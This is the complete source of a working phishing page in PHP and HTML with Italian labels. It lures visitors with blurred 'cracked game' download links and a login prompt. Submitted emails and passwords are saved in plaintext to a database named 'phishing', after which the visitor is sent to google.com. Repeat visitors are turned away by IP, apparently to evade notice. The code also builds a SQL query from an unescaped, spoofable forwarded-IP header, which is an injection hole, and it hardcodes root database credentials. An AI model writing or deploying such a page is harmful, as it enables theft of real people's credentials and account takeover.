<?php

$db_host = "localhost";
$db_user = "root";
$db_pass = "root";
$db_name = "phishing";

$conn = new mysqli($db_host,$db_user,$db_pass, $db_name) or die("Errore connessione server");

// Function to get the client IP address
function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$query = "select count(*) from utenti where ip like '".get_client_ip()."'";

$ris = $conn->query($query);
if ($ris->fetch_row()[0] != 0) {
    header("Location: http://www.google.com/");
    exit();
}

if (isset($_POST["email"]) && isset($_POST["password"])) {

    $query = 'insert utenti VALUES("'.
        get_client_ip()
        .'", "'.
        $conn->real_escape_string($_POST["email"])
        .'", "'.
        $conn->real_escape_string($_POST["password"])
        .'")';

    $conn->query($query);

    header("Location: http://www.google.com/");
    exit();

}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>index</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">

    <style>
        body {
            background: rgb(147,147,147);
            background: linear-gradient(0deg, rgb(76, 76, 76) 0%, rgba(0,0,0,1) 100%);
        }
        #content {
            width: 90%;
            margin-left: 5%;
            margin-right: 5%;
            height: 100vh;
            border-left: red solid;
            border-right: red solid;
        }

        #titolo {
            text-align: center;
            color: white;
            padding-top: 10px;
        }

        .news {
            width: 90%;
            background-color: white;
            margin-left: 5%;
            margin-bottom: 50px;
            padding: 3px 3px 3px 3px;
        }

        .giocoTitolo {
            color: darkred;
            margin-left: 10%;
        }

        .loked {
            color: transparent;
            text-shadow: 0 0 8px #000;
            padding-left: 10px;
            padding-right: 10px;
        }

        #notify {
            position: absolute;
            height: 30px;
            background-color: lightgray;
            padding-left: 10px;
            padding-right: 10px;
        }

        #login {
            margin-bottom: 20px;
            border-radius: 4px;
            background-color: white;
        }

    </style>

</head>
<body>


<div id="notify" style="left: 100px; top: 100px">
    Eseguire il login per visionare il contenuto
</div>

<div id="content">


    <h1 id="titolo">
        Sito
    </h1>

    <center>
        <button id="login" onclick="window.location.href = 'login.php'">Login</button>
    </center>


    <div class="news">
        <h1 class="giocoTitolo">Gioco</h1>
        <ul class="contentNews">
            <li>Crack status: Fatta</li>
            <li>Download:
                <span class="loked">https://www.downloand.com</span>
            </li>
        </ul>
    </div>

    <div class="news">
        <h1 class="giocoTitolo">Gioco</h1>
        <ul class="contentNews">
            <li>Crack status: Fatta</li>
            <li>Download:
                <span class="loked">https://www.downloand.com</span>
            </li>
        </ul>
    </div>


</div>

<script>

    var elements = document.getElementsByClassName("loked");

    var cursor_x = -1;
    var cursor_y = -1;
    document.onmousemove = function(event)
    {
        cursor_x = event.pageX;
        cursor_y = event.pageY;
    }
    var display = false;
    var el = document.getElementById("notify");

    function displayThing() {
        if (display) {
            el.style.display = "initial";
            el.style.left = cursor_x + 'px'
            el.style.top = cursor_y - 40 + 'px'
        } else el.style.display = "none";
    }

    setInterval(displayThing, 10);

    for(var i = 0; i < elements.length; i++) {
        elements[i].onmouseover = function (event) {
            display = true;
        }
        elements[i].onmouseout = function (event) {
            display = false;
        }
    }

</script>

<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</body>
</html>